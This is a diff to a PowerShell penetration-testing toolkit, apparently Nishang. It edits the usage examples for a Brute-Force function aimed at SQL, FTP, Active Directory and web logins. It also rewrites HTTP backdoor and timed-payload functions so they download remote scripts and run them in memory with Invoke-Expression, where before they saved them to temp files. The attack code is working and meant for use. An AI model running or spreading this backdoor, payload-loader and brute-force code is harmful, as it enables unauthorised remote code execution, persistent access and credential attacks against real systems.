@@ -1452,19 +1452,19 @@ Specifies a Password.
 Enter a Service. Default service is set to SQL.
 
 .EXAMPLE
-Brute-Force -Identity SRV01 -UserName sa -Password ""
+PS> Brute-Force -Identity SRV01 -UserName sa -Password ""
 
 .EXAMPLE
-Brute-Force -Identity ftp://SRV01 -UserName sa -Password "" -Service FTP
+PS> Brute-Force -Identity ftp://SRV01 -UserName sa -Password "" -Service FTP
 
 .EXAMPLE
-"SRV01","SRV02","SRV03" | Brute-Force -UserName sa -Password sa
+PS> "SRV01","SRV02","SRV03" | Brute-Force -UserName sa -Password sa
 
 .EXAMPLE
-Brute-Force -Identity "domain.local" -UserName administrator -Password Password1 -Service ActiveDirectory
+PS> Brute-Force -Identity "domain.local" -UserName administrator -Password Password1 -Service ActiveDirectory
 
 .EXAMPLE
-Brute-Force -Identity "http://www.something.com" -UserName user001 -Password Password1 -Service Web
+PS> Brute-Force -Identity "http://www.something.com" -UserName user001 -Password Password1 -Service Web
 
 .LINK
 http://www.truesec.com
@@ -1886,14 +1886,12 @@ function Logic-Execute-OnTime ($URL, $time, $CheckURL, $StopString, $dev_key, $u
     while($true)
     {
     start-sleep -seconds 5 
+    $webclient = New-Object System.Net.WebClient
     $filecontent = $webclient.DownloadString("$CheckURL")
     $systime = Get-Date -UFormat %R
     if ($systime -match $time)
     {
-        $webclient = New-Object System.Net.WebClient 
-        $file = "$env:temp\time_payload.ps1"
-        $webclient.DownloadFile($URL,$file) 
-        $pastevalue = Invoke-Expression $file
+        $pastevalue = Invoke-Expression $webclient.DownloadString($URL)
         $pastevalue
         $exec++
         if ($exfil -eq $True)
@@ -2141,10 +2139,7 @@ function Logic-HTTP-Backdoor($CheckURL, $PayloadURL, $MagicString, $StopString, 
     $filecontent = $webclient.DownloadString("$CheckURL")
     if($filecontent -eq $MagicString)
     {
-        $webclient = New-Object System.Net.WebClient
-        $file1 = "$env:temp\payload.ps1"
-        $webclient.DownloadFile($PayloadURL,"$file1")
-        $pastevalue = Invoke-Expression $file1
+        $pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL)
         $pastevalue
         $exec++
         if ($exfil -eq $True)
@@ -2815,10 +2810,7 @@ http://code.google.com/p/nishang
 #>
 
     Param( [Parameter(Position = 0, Mandatory = $True)] [String] $ScriptURL)
-    $webclient = New-Object System.Net.WebClient
-    $file1 = "$env:temp\deps.ps1"
-    $webclient.DownloadFile($ScriptURL,"$file1")
-    $script:pastevalue = powershell.exe -ExecutionPolicy Bypass -noLogo -command $file1
+    Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"));
     $pastevalue
 }
 
